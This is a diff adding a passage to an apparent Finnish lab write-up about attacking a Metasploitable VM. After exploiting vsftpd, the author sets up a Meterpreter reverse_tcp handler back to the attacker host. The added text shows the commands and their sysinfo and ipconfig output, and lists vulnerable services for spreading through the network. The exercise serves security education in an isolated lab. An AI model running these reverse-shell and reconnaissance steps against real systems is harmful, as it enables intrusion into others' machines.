@@ -66,7 +66,53 @@ Seuraavaksi kokeilin murtautua Metasploitableen käyttäen takaovea portissa 21 
 
 _Onnistunut vsftpd hyökkäys_
 
+Onnistuneen hyökkäyksen jälkeen aloin valmistelemaan Meterpreteriä, jotta voisin kerätä levittämiseen tarvittavaa tietoa tehokkaasti. Aluksi asetin `vsftpd`-yhteyden taustalle komennolla `background` ja suoritin Meterpreter-yhteyden luomisen seuraavalla komentosarjalla;
 
+```
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST 192.168.82.4
+set LPORT 4443
+exploit -j
+```
+
+Tämä komentopätkä kertoi Meterpreterille tärkeät tiedot kohteesta sekä omasta koneestani. Tämän jälkeen voin päivättää nykyisen yhteyden `sessions 1` komennolla `sessions -u 1` ja täten saada Meterpreter toimimaan `vsftpd`-shellissä komennolla `sessions -i 2`
+
+![image](https://github.com/user-attachments/assets/19638edd-d664-4ea4-9c94-377d808ce815)
+
+_Meterpreter käyttöön_
+
+Nyt kun sain Meterpreterin käyttöön, oli helppoa kerätä tärkeää tietoa koneesta jatkotoimien kannalta. Levittäytymiseen tähtäävä toimija saattaa olla kiinnostunut esimerkiksi kolmesta seuraavasta tiedoista;
+
+```
+meterpreter > sysinfo
+Computer     : metasploitable.localdomain
+OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
+Architecture : i686
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+meterpreter > ipconfig
+```
+
+Komento `sysinfo` kertoi koneen melko traagisesta tietoturvatilasta jossa käyttöjärjestelmä, kerneli ja arkkitehtuuri ovat vanhentuneita tai vanhaa teknologiaa. Tämä tarjoaa runsaasti jatkohyökkäysmahdollisuuksia.
+
+```
+meterpreter > ipconfig
+Interface  2
+============
+Name         : eth0
+Hardware MAC : 08:00:27:29:72:cb
+MTU          : 1500
+Flags        : UP,BROADCAST,MULTICAST
+IPv4 Address : 192.168.82.3
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : fe80::a00:27ff:fe29:72cb
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+```
+
+Komento `ipconfig` kertoi lisää koneen verkosta. Sain tätä kautta tietoon aliverkkomaskin `255.255.255.0` jota voi hyödyntää verkon skannaamisessa. Voimme myös olettaa laitteen olevan virtuaalikone sillä MAC-osoite `08:00:27` yhdistetään yleensä VirtualBoxiin.
+
+Lopuksi ajoin komennon `ps`, joka kertoi koneen prosesseista. Huomattavia olivat esimerkiksi `4194 mysqld` josta voisi kaivaa kriittistä dataa, `distccd`, jonka tunnettu heikkous sallii koodin ajamisen etänä sekä `4054 named` eli BIND DNS-palvelin, jotka ovat tunnetusti alttiita hyökkäyksille. Näiden lisäksi prosesseissa on lukuisia muita heikkouksia joiden avulla voisi levittäytyä järjestelmään.
 
 ### Lähteet
 
